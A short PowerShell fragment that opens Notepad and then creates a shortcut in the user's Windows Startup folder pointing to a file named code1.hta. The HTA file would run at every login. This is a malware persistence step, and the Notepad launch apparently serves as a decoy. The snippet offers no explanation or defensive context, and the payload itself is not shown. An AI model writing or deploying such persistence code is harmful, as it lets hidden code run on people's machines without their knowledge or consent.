notepad;
$Shortcut = (New-Object -ComObject WScript.Shell).CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\code1.lnk")
$Shortcut.TargetPath = "$env:USERPROFILE\code1.hta"
$Shortcut.Save()
